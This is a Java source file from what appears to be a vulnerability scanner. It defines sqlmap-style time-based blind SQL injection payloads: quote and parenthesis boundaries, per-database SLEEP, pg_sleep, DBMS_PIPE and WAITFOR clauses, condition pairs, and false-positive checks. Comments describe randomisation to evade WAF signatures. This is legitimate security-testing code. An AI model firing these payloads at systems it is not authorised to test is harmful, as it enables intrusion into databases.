package com.xzhscan.vendor.sql;

import java.util.List;

/**
 * sqlmap 注入模型（v4.0 引入，参考 sqlmap_src 的 boundaries.xml / time_blind.xml）。
 *
 * <p>sqlmap 把一个注入点拆成三段：</p>
 * <pre>
 *   最终参数值 = &lt;boundary.prefix&gt; + &lt;clause&gt; + &lt;boundary.suffix&gt;
 * </pre>
 * <ul>
 *   <li><b>clause</b>：独立于上下文的 SQL 子句（如 {@code AND (SELECT ...SLEEP(S)...)}），
 *       不含引号闭合与注释，与具体参数类型无关；</li>
 *   <li><b>boundary</b>：注入点上下文的闭合形态——数字型 {@code 1}、单引号 {@code '}、
 *       单引号加括号 {@code ')}、双引号 {@code "}、双层括号 {@code '))}；
 *       后缀是注释符 {@code -- -} 或补全式 {@code AND 'x'='x}。</li>
 * </ul>
 *
 * <p>与旧实现（payload 自带 {@code ' AND ...-- -}）相比，boundary 与 clause 解耦后，
 * 同一 clause 可以覆盖数字型 / 字符型 / 嵌套引号 / 括号闭合等多种上下文，
 * 这是 sqlmap 能适应任意注入点的核心原因。</p>
 *
 * <p>随机化：{@code {R}} 随机数字、{@code {C}} 随机字母——与 sqlmap 的
 * {@code [RANDNUM]}/{@code [RANDSTR]} 等价，避免缓存命中与固定特征被 WAF 识别。</p>
 */
public final class SqlmapTimeModel {

    private SqlmapTimeModel() {
    }

    /**
     * 注入上下文边界。
     *
     * @param prefix 左闭合形态（数字型用干净占位符 {@code 1}，字符型用引号/括号）
     * @param suffix 右闭合形态（注释符或补全式条件）
     * @param label  标签（证据与日志用）
     */
    public record Boundary(String prefix, String suffix, String label) {

        /** 套用 boundary：prefix + clause + suffix。 */
        public String wrap(String clause) {
            return prefix + clause + suffix;
        }

        /** 是否字符型上下文（prefix 含引号）。 */
        public boolean stringCtx() {
            return prefix.indexOf('\'') >= 0 || prefix.indexOf('"') >= 0;
        }
    }

    /**
     * 时间盲注子句（sqlmap time_blind.xml 核心形态，按 DBMS）。
     * 占位：{@code {S}} 延迟秒数、{@code {R}} 随机数字、{@code {C}} 随机字母。
     */
    public record TimeClause(String clause, String db, String label) {
    }

    /**
     * 条件对子句（sqlmap time_blind.xml 的减法形态原样）：
     * {@code SLEEP(S-(IF(cond,0,S)))} —— cond 真时睡 S 秒、假时睡 0 秒。
     * 单请求内建 TRUE/FALSE 对照，比发两个不同 payload 更抗抖动。
     */
    public record ConditionPair(String trueClause, String falseClause, String db, String label) {
    }

    /**
     * 假阳性检查项（sqlmap {@code checkFalsePositives} 语义）：
     * 用随机三数构造"必须延迟"与"必须不延迟"的表达式，全部符合才认为注入点真实。
     */
    public record FalsePositiveProbe(String clause, boolean shouldDelay, String label) {
    }

    /**
     * 主流 boundary（对齐 sqlmap boundaries.xml level 1-2 的 where=1 形态）。
     * 顺序即探测顺序：数字型→单引号→单引号括号→双引号→双层括号→无注释补全。
     */
    public static final List<Boundary> BOUNDARIES = List.of(
            new Boundary("1", "-- -", "数字型·注释"),
            new Boundary("1", "", "数字型·无注释"),
            new Boundary("'", "-- -", "单引号·注释"),
            new Boundary("')", "-- -", "单引号+括号·注释"),
            new Boundary("\"", "-- -", "双引号·注释"),
            new Boundary("'))", "-- -", "双层括号·注释"),
            new Boundary("'", " AND 'x'='x", "单引号·补全闭合"),
            new Boundary("')", " AND ('x'='x", "单引号+括号·补全闭合"),
            // v4.1.1（P2-1）：吸收 xray 独有的绕过形态——反引号 + # 注释。
            // 注意：/**/ 只能替代空格、不能当注释符（'/**/ 后原 SQL 的引号仍会闭合，
            // 靶场实测不成立），它的价值在 clause 内部替代空格 → 由 QUICK 的
            // "空格→/**/" 变体承担（level 2 启用），不作为 boundary 后缀。
            new Boundary("`", "#", "反引号·#注释"),
            new Boundary("`", " ", "反引号·空格")
    );

    /**
     * 时间盲注子句集（每 DBMS 取 sqlmap 的核心 query-SLEEP / IF 形态）。
     * 只收录与旧 payload 集不重复、且能覆盖新 boundary 的形态。
     */
    public static final List<TimeClause> TIME_CLAUSES = List.of(
            new TimeClause(" AND (SELECT {R} FROM (SELECT(SLEEP({S}))){C})", "MySQL", "mysql-query-sleep"),
            new TimeClause(" AND {R}=IF((1=1),SLEEP({S}),{R})", "MySQL", "mysql-if-sleep"),
            new TimeClause(" AND (SELECT {R} FROM pg_sleep({S}))", "PostgreSQL", "pg-sleep-select"),
            new TimeClause(" AND {R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle", "oracle-pipe")
    );

    /**
     * 独立子句（不套 boundary，本身就是完整语句或子句追加形态）：
     * MSSQL 堆叠 WAITFOR、ORDER BY 逗号子查询（吸收 xray 的 ORDER 集独有能力）。
     */
    public static final List<TimeClause> STANDALONE_CLAUSES = List.of(
            new TimeClause("; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", "mssql-waitfor-stacked"),
            new TimeClause(",(select*from(select+sleep({S}))a)", "MySQL", "mysql-orderby-subq"),
            new TimeClause(",(select 1 from pg_sleep({S}))", "PostgreSQL", "pg-orderby")
    );

    /**
     * 条件对（sqlmap 减法形态，原样引自 time_blind.xml 的 vector）：
     * {@code SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))}。
     * TRUE 条件延迟 S、FALSE 条件延迟 0——差值接近 S 才认定时间注入。
     */
    public static final List<ConditionPair> CONDITION_PAIRS = List.of(
            new ConditionPair(
                    " AND (SELECT {R} FROM (SELECT(SLEEP({S}-(IF((1=1),0,{S}))))){C})",
                    " AND (SELECT {R} FROM (SELECT(SLEEP({S}-(IF((1=2),0,{S}))))){C})",
                    "MySQL", "mysql-sub-pair"),
            new ConditionPair(
                    " AND CASE WHEN (1=1) THEN pg_sleep({S})::text ELSE '' END=''",
                    " AND CASE WHEN (1=2) THEN pg_sleep({S})::text ELSE '' END=''",
                    "PostgreSQL", "pg-case-pair"),
            new ConditionPair(
                    " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})",
                    " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',0)",
                    "Oracle", "oracle-pipe-pair")
    );

    /**
     * 生成假阳性检查表达式（sqlmap checkFalsePositives 的交叉验证矩阵）：
     * <pre>
     *   r1 &lt; r2 &lt; r3
     *   r1=r1 / r2=r2  → 必须延迟（真条件）
     *   r1=r2 / r1=r3 / r3=r2 → 必须不延迟（假条件）
     *   "r3 r2"        → 非法语句，必须不延迟
     * </pre>
     * 任一不符 → 该注入点是假阳性（站点不按条件执行 SQL，延迟来自抖动）。
     */
    public static List<FalsePositiveProbe> falsePositiveProbes(int r1, int r2, int r3) {
        return falsePositiveProbes("MySQL", r1, r2, r3);
    }

    /**
     * 按 DBMS 生成假阳性检查表达式（v4.0.1 修复：此前无条件用 MySQL 语法，
     * 导致 Oracle/PG 的真注入因语法错误秒回被误判假阳性）。
     * 不支持的 DBMS 返回空列表 = {@code 跳过检查}（不是判假阳性）。
     */
    public static List<FalsePositiveProbe> falsePositiveProbes(String db, int r1, int r2, int r3) {
        switch (db == null ? "" : db) {
            case "MySQL": {
                String tpl = " AND (SELECT {R} FROM (SELECT(SLEEP({S}-(IF((%s),0,{S}))))){C})";
                return List.of(
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
            }
            case "PostgreSQL": {
                String tpl = " AND CASE WHEN (%s) THEN pg_sleep({S})::text ELSE '' END=''";
                return List.of(
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
            }
            case "Oracle": {
                String tpl = " AND (CASE WHEN (%s) THEN DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S}) ELSE 1 END)={R}";
                return List.of(
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
            }
            case "MSSQL": {
                String tpl = "; IF(%s) WAITFOR DELAY '0:0:{S}'-- -";
                return List.of(
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
            }
            default:
                return List.of(); // 无对应语法 → 跳过交叉验证，不误杀
        }
    }

    /** 渲染 clause 占位（{S}/{R}/{C}）。 */
    public static String render(String template, int seconds) {
        return template
                .replace("{S}", Integer.toString(seconds))
                .replace("{R}", SqlPayloadLibrary.newRand())
                .replace("{C}", randomAlpha(6));
    }

    private static String randomAlpha(int n) {
        final String pool = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) {
            sb.append(pool.charAt(java.util.concurrent.ThreadLocalRandom.current().nextInt(pool.length())));
        }
        return sb.toString();
    }

    /**
     * 按参数原值挑选候选 boundary（先字符串型，再数字型）：
     * 原值是纯数字 → 数字型 boundary 在前；否则字符型 boundary 在前。
     */
    public static List<Boundary> boundariesFor(String originalValue) {
        boolean numeric = originalValue != null && originalValue.matches("-?\\d+(\\.\\d+)?");
        List<Boundary> ordered = new java.util.ArrayList<>();
        for (Boundary b : BOUNDARIES) {
            if (b.stringCtx() != numeric) {
                ordered.add(b);
            }
        }
        for (Boundary b : BOUNDARIES) {
            if (b.stringCtx() == numeric) {
                ordered.add(b);
            }
        }
        return ordered;
    }
}
